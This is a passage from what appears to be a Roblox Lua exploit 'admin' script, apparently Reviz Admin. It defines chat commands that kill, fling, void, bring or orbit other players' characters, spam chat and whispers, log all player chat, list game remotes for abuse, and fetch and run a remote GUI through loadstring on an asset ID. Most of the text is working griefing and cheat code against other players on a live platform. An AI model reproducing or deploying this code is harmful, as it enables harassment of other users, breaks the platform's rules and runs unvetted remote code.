        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Attempting Shutdown";
        Text = "Shutdown Attempt has begun.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."delobj ") then
        objtodel = (string.sub(msg, 9))
        for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v.Name == objtodel then
                v:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."getplrs") then
        for i,v in pairs(game:GetService("Players"):GetPlayers())do
            print(v)
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Printed";
        Text = "Players have been printed to console. (F9)";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."deldecal") then
        for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
            if (v:IsA("Decal")) then
                v:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."opfinality") then
        loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "OpFinality GUI has loaded.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."remotes") then
        remotes = true
        added = true
        game.DescendantAdded:connect(function(rmt)
        if added == true then
        if remotes == true then
        if rmt:IsA("RemoteEvent") then
        print("A RemoteEvent was added!")
        print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
        print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
        end end end
        end)
        game.DescendantAdded:connect(function(rmtfnctn)
        if added == true then
        if remotes == true then
        if rmtfnctn:IsA("RemoteFunction") then
        warn("A RemoteFunction was added!")
        warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
        print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
        end end end
        end)
       
        game.DescendantAdded:connect(function(bndfnctn)
        if added == true then
        if binds == true then
        if bndfnctn:IsA("BindableFunction") then
        print("A BindableFunction was added!")
        print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
        print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
        end end end
        end)
       
        game.DescendantAdded:connect(function(bnd)
        if added == true then
        if binds == true then
        if bnd:IsA("BindableEvent") then
        warn("A BindableEvent was added!")
        warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
        print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
        end end end
        end)
       
       
        if binds == true then
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("BindableFunction") then
        print(" game." .. v:GetFullName() .. " | BindableFunction")
        print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
        end end
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("BindableEvent") then
        warn(" game." .. v:GetFullName() .. " | BindableEvent")
        print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
        end end
        else
        print("Off")
        end
        if remotes == true then
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteFunction") then
        warn(" game." .. v:GetFullName() .. " | RemoteFunction")
        print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
        end end
        wait()
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
        print(" game." .. v:GetFullName() .. " | RemoteEvent")
        print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
        end end
        else
        print("Off")
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Printing Remotes";
        Text = "Type ;noremotes to disable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."noremotes") then
        remotes = false
        added = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Printing Remotes Disabled";
        Text = "Type ;remotes to enable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."tpdefault") then
        spin = false
        followed = false
        traill = false
        noclip = false
        annoying = false
        hwalk = false
        cbringing = false
    end
    if string.sub(msg, 1, 8) == (prefix.."stopsit") then
        stopsitting = true
    end
    if string.sub(msg, 1, 6) == (prefix.."gosit") then
        stopsitting = false
    end
    if string.sub(msg, 1, 8) == (prefix.."version") then
        print(adminversion)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Version";
        Text = adminversion;
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."clicktp") then
        clickgoto = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click TP";
        Text = "Press E to teleport to mouse position, ;noclicktp to stop";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."clickdel") then
        clickdel = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click Delete";
        Text = "Press E to delete part at mouse, ;noclickdel to stop";
        })
    end
    if string.sub(msg, 1, 11) == (prefix.."noclickdel") then
        clickdel = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click Delete";
        Text = "Click delete has been disabled.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."noclicktp") then
        clickgoto = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click TP";
        Text = "Click TP has been disabled.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."toolson") then
        gettingtools = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Tools Enabled";
        Text = "Automatically colleting tools dropped.";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."toolsoff") then
        gettingtools = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Tools Disabled";
        Text = "Click TP has been disabled.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."delcmdbar") then
        ScreenGui:Destroy()
    end
    if string.sub(msg, 1, 6) == (prefix.."reset") then
        lplayer.Character.Head:Destroy()
    end
    if string.sub(msg, 1, 7) == (prefix.."state ") then
        statechosen = string.sub(msg, 8)
        changingstate = true
    end
    if string.sub(msg, 1, 9) == (prefix.."gravity ") then
        game:GetService("Workspace").Gravity = string.sub(msg, 10)
    end
    if string.sub(msg, 1, 10) == (prefix.."looprhats") then
        removingmeshhats = true
    end
    if string.sub(msg, 1, 12) == (prefix.."unlooprhats") then
        removingmeshhats = false
    end
    if string.sub(msg, 1, 10) == (prefix.."looprtool") then
        removingmeshtool = true
    end
    if string.sub(msg, 1, 12) == (prefix.."unlooprtool") then
        removingmeshtool = false
    end
    if string.sub(msg, 1, 10) == (prefix.."givetool ") then
        for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
            if v:IsA("Tool") then
                for i,player in pairs(GetPlayer(string.sub(msg, 11))) do
                    v.Parent = player.Character
                end
            end
        end
    end
    if string.sub(msg, 1, 14) == (prefix.."givealltools ") then
        for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
            if v:IsA("Tool") then
                v.Parent = lplayer.Character
                wait()
                for i,player in pairs(GetPlayer(string.sub(msg, 15))) do
                    v.Parent = player.Character
                end
            end
        end
    end
    if string.sub(msg, 1, 5) == (prefix.."age ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
        end
    end
    if string.sub(msg, 1, 4) == (prefix.."id ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 5))) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
        end
    end
    if string.sub(msg, 1, 6) == (prefix..".age ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 7))) do
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = player.AccountAge.." Days";
            Text = "Account age of "..player.Name;
            })
        end
    end
    if string.sub(msg, 1, 5) == (prefix..".id ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = player.UserId.." ID";
            Text = "Account ID of "..player.Name;
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."gameid") then
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Game ID";
        Text = "Game ID: ".. game.GameId;
        })
    end
    if string.sub(msg, 1, 4) == (prefix.."pgs") then
        local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
        if pgscheck == true then
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "PGSPhysicsSolverEnabled";
            Text = "PGS is Enabled!";
            })
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "PGSPhysicsSolverEnabled";
            Text = "PGS is Disabled!";
            })
        end
    end
    if string.sub(msg, 1, 12) == (prefix.."removeinvis") then
        for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v:IsA("Part") then
                if v.Transparency == 1 then
                    if v.Name ~= "HumanoidRootPart" then
                        v:Destroy()
                    end
                end
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."removefog") then
        game:GetService("Lighting").FogStart = 0
        game:GetService("Lighting").FogEnd = 9999999999999
    end
    if string.sub(msg, 1, 8) == (prefix.."disable") then
        lplayer.Character.Humanoid.Parent = lplayer
    end
    if string.sub(msg, 1, 7) == (prefix.."enable") then
        lplayer.Humanoid.Parent = lplayer.Character
    end
    if string.sub(msg, 1, 8) == (prefix.."prefix ") then
        prefix = (string.sub(msg, 9, 9))
        wait(0.1)
        change()
        wait(0.1)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Prefix changed!";
        Text = "Prefix is now "..prefix..". Use ;resetprefix to reset to ;";
        })
    end
    if string.sub(msg, 1, 12) == (";resetprefix") then
        prefix = ";"
        wait(0.1)
        change()
        wait(0.1)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Prefix changed!";
        Text = "Prefix is now "..prefix..". Make sure it's one key!";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."flyspeed ") then
        speedfly = string.sub(msg, 11)
        wait()
        change()
    end
    if string.sub(msg, 1, 8) == (prefix.."carpet ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            local Anim3 = Instance.new("Animation")
            Anim3.AnimationId = "rbxassetid://282574440"
            local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
            track3:Play(.1, 1, 1)
            bplrr = v.Name
            banpl = true
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."uncarpet") then
        banpl = false
    end
    if string.sub(msg, 1, 7) == (prefix.."stare ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            staring = true
            stareplr = v
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unstare") then
        staring = false
    end
    if string.sub(msg, 1, 8) == (prefix.."logchat") then
        chatlogs = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "LogChat enabled";
        Text = "Now logging all player chat.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."unlogchat") then
        chatlogs = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "LogChat disabled";
        Text = "Stopped logging all player chat.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."fixcam") then
        game:GetService("Workspace").CurrentCamera:Destroy()
        wait(0.1)
        game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
        game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
        lplayer.CameraMinZoomDistance = 0.5
        lplayer.CameraMaxZoomDistance = 400
        lplayer.CameraMode = "Classic"
    end
    if string.sub(msg, 1, 8) == (prefix.."unstate") then
        changingstate = false
    end
end)
 
local function tp()
    for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            if player.Name == brplr then
                player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 2
            end
        end
    end
end
local function tpall()
    for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 3
        end
    end
end
spawn(function()
    while wait(spamdelay) do
        if spamming == true then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamtext, "All")
        end
    end
end)
spawn(function()
    while wait(spamdelay) do
        if spammingpm == true then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..pmspammed.." @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "All")
        end
    end
end)
spawn(function()
    while wait() do
        if cbring == true then
            tp()
        end
    end
end)
spawn(function()
    while wait() do
        if cbringall == true then
            tpall()
        end
    end
end)
 
Mouse.KeyDown:connect(function(Key)
    if Key == prefix then
        CMDBAR:CaptureFocus()
    end
end)
 
CMDBAR.FocusLost:connect(function(enterPressed)
    if enterPressed then
        if string.sub(CMDBAR.Text, 1, 5) == ("kill ") then
            if string.sub(CMDBAR.Text, 6) == "me" then
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6)))do
                    local NOW = lplayer.Character.HumanoidRootPart.CFrame
                    lplayer.Character.Humanoid.Name = 1
                    local l = lplayer.Character["1"]:Clone()
                    l.Parent = lplayer.Character
                    l.Name = "Humanoid"
                    wait(0.1)
                    lplayer.Character["1"]:Destroy()
                    game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                    lplayer.Character.Animate.Disabled = true
                    wait(0.1)
                    lplayer.Character.Animate.Disabled = false
                    lplayer.Character.Humanoid.DisplayDistanceType = "None"
                    for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                    lplayer.Character.Humanoid:EquipTool(v)
                    end
                    local function tp(player,player2)
                    local char1,char2=player.Character,player2.Character
                    if char1 and char2 then
                    char1:MoveTo(char2.Head.Position)
                    end
                    end
                    wait(0.1)
                    lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                    wait(0.2)
                    lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                    wait(0.5)
                    lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
                    wait(0.7)
                    tp(lplayer,game:GetService("Players")[v.Name])
                    wait(0.7)
                    lplayer.Character.HumanoidRootPart.CFrame = NOW
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Tools needed!";
                    Text = "You need a tool in your backpack for this command!";
                    })
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("bring ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
                end
                end
                local function getout(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                tp(game:GetService("Players")[v.Name], lplayer)
                wait(0.2)
                tp(game:GetService("Players")[v.Name], lplayer)
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                wait(0.5)
                getout(lplayer, game:GetService("Players")[v.Name])
                wait(0.3)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("spin ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                spinplr = v
                wait(0.5)
                spin = true
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("unspin") then
            spin = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("attach ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                wait(0.3)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
                attplr = v
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("unattach ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                local function getout(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                getout(lplayer, game:GetService("Players")[v.Name])
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("follow ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 8))) do
                followed = true
                flwplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("unfollow") then
            followed = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("freefall ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.6)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                wait(0.6)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("trail ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                traill = true
                trlplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("untrail") then
            traill = false
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("orbit ") then
            if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
                lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                    local o = Instance.new("RocketPropulsion")
                    o.Parent = lplayer.Character.HumanoidRootPart
                    o.Name = "Orbit"
                    o.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                    o:Fire()
                    noclip = true
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unorbit") then
            lplayer.Character.HumanoidRootPart.Orbit:Destroy()
            noclip = false
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("fling ") then
            if string.sub(CMDBAR.Text, 7) == "all" or string.sub(CMDBAR.Text, 7) == "others" or string.sub(CMDBAR.Text, 7) == "me" then
                lplayer.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                    local y = Instance.new("RocketPropulsion")
                    y.Parent = lplayer.Character.HumanoidRootPart
                    y.CartoonFactor = 1
                    y.MaxThrust = 800000
                    y.MaxSpeed = 1000
                    y.ThrustP = 200000
                    y.Name = "Fling"
                    game:GetService("Workspace").CurrentCamera.CameraSubject = game:GetService("Players")[v.Name].Character.Head
                    y.Target = game:GetService("Players")[v.Name].Character.HumanoidRootPart
                    y:Fire()
                    noclip = true
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unfling") then
            noclip = false
            lplayer.Character.HumanoidRootPart.Fling:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Head
            wait(0.4)
            lplayer.Character.HumanoidRootPart.Fling:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("fecheck") then
            if game:GetService("Workspace").FilteringEnabled == true then
                warn("FE is Enabled (Filtering Enabled)")
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "FE is Enabled";
                    Text = "Filtering Enabled. Enjoy using Reviz Admin!";
                })
            else
                warn("FE is Disabled (Filtering Disabled) Consider using a different admin script.")
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "FE is Disabled";
                    Text = "Filtering Disabled. Consider using a different admin script.";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("void ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.2)
                lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                wait(0.6)
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999999999,0,999999999999999)
                game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Tools needed!";
                Text = "You need a tool in your backpack for this command!";
                })
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("noclip") then
            noclip = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Noclip enabled";
            Text = "Type ;clip to disable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 4) == ("clip") then
            noclip = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Noclip disabled";
            Text = "Type ;noclip to enable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("speed ") then
            lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 7))
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("ws ") then
            lplayer.Character.Humanoid.WalkSpeed = (string.sub(CMDBAR.Text, 4))
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("hipheight ") then
            lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 11))
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("hh ") then
            lplayer.Character.Humanoid.HipHeight = (string.sub(CMDBAR.Text, 4))
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("jumppower ") then
            lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 11))
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("jp ") then
            lplayer.Character.Humanoid.JumpPower = (string.sub(CMDBAR.Text, 4))
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("default") then
            lplayer.Character.Humanoid.JumpPower = 50
            lplayer.Character.Humanoid.WalkSpeed = 16
            lplayer.Character.Humanoid.HipHeight = 0
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("annoy ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7))) do
                annoying = true
                annplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("unannoy") then
            annoying = false
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("headwalk ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 10))) do
                hwalk = true
                hdwplr = v
            end
        end
        if string.sub(CMDBAR.Text, 1, 10) == ("unheadwalk") then
            hwalk = false
        end
        if string.sub(CMDBAR.Text, 1, 7) == ("nolimbs") then
            lplayer.Character["Left Leg"]:Destroy()
            lplayer.Character["Left Arm"]:Destroy()
            lplayer.Character["Right Leg"]:Destroy()
            lplayer.Character["Right Arm"]:Destroy()
        end
        if string.sub(CMDBAR.Text, 1, 3) == ("god") then
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "FE Godmode enabled";
            Text = "Use ;grespawn or ;respawn to remove.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("drophats") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                    v.Parent = workspace
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 8) == ("droptool") then
            for i,v in pairs(lplayer.Character:GetChildren()) do
                if (v:IsA("Tool")) then
                    v.Parent = workspace
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("loopdhats") then
            droppinghats = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Enabled";
            Text = "Type ;unloopdhats to disable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unloopdhats") then
            droppinghats = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Disabled";
            Text = "Type ;loopdhats to enable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("loopdtool") then
            droppingtools = true
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Enabled";
            Text = "Type ;unloopdtool to disable";
            })
        end
        if string.sub(CMDBAR.Text, 1, 11) == ("unloopdtool") then
            droppingtools = false
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Loop Drop Disabled";
            Text = "Type ;loopdtool to enable.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 9) == ("invisible") then -- Credit to Timeless
            Local = game:GetService('Players').LocalPlayer
            Char  = Local.Character
            touched,tpdback = false, false
            box = Instance.new('Part',workspace)
            box.Anchored = true
            box.CanCollide = true
            box.Size = Vector3.new(10,1,10)
            box.Position = Vector3.new(0,10000,0)
            box.Touched:connect(function(part)
                if (part.Parent.Name == Local.Name) then
                    if touched == false then
                        touched = true
                        function apply()
                            if script.Disabled ~= true then
                                no = Char.HumanoidRootPart:Clone()
                                wait(.25)
                                Char.HumanoidRootPart:Destroy()
                                no.Parent = Char
                                Char:MoveTo(loc)
                                touched = false
                            end end
                        if Char then
                            apply()
                        end
                    end
                end
            end)
            repeat wait() until Char
            loc = Char.HumanoidRootPart.Position
            Char:MoveTo(box.Position + Vector3.new(0,.5,0))
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Invisibility enabled!";
            Text = "Reset or use ;respawn to remove.";
            })
        end
        if string.sub(CMDBAR.Text, 1, 5) == ("view ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6))) do
                if game:GetService("Players")[v.Name].Character.Humanoid then
